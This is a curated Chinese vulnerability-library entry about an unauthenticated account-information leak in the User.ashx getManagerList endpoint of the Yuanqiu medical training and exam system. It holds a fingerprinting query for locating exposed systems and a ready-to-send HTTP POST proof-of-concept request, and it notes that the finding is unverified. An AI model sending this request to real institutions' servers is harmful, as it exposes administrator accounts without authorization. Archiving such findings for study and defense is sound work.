---
source: "wy876 漏洞文库"
title: "远秋医学培训报名/在线考试系统（产品边界待核） User.ashx getManagerList账号信息泄露"
product: "远秋医学培训报名/在线考试系统（产品边界待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "声称培训报名v1.0，指纹在线考试"
prerequisites: "未授权声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xp1atq8wl0rmv68n"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%BF%9C%E7%A7%8B%E5%8C%BB%E5%AD%A6%E5%9C%A8%E7%BA%BF%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F/%E8%BF%9C%E7%A7%8B%E5%8C%BB%E5%AD%A6%E5%9F%B9%E8%AE%AD%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9FUser%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
id: "vw-fa5776d4b43f8ba97ac0826d"
entity_id: "ve-fa5776d4b43f8ba97ac0826d"
schema_version: "1"
---

# 远秋医学培训报名/在线考试系统（产品边界待核） User.ashx getManagerList账号信息泄露

## 条目说明

- 对象与具体问题：远秋医学培训报名/在线考试系统（产品边界待核）；User.ashx getManagerList账号信息泄露
- 版本、配置及部署条件：声称培训报名v1.0，指纹在线考试
- 认证与权限前提：未授权声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题培训报名、简介及指纹在线考试混用，需核是否同产品模块而非直接合并
- 只有列表请求，没有账户密码字段/格式或管理员登录证明
- 无修复，尾斜杠处理前提未明

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
远秋医学在线考试系统采用通用的试题库管理软件，适用于各级各类医学院校和医院。远秋医学在线考试系统某接口存在未授权信息泄露漏洞，攻击者可利用该漏洞获取数据库敏感信息。远秋医学培训报名系统v1.0存在未授权访问漏洞，攻击者可通过漏洞获取登录密码。

## 二、影响版本
+ 远秋医学培训报名系统v1.0

## 三、资产测绘
```plain
title="医学在线考试系统"
```


## 四、漏洞复现
```http
POST /Manage/Ajax/User.ashx/ HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

oper=getManagerList&name=&code=&depart=&page=1&rows=15
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xp1atq8wl0rmv68n>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
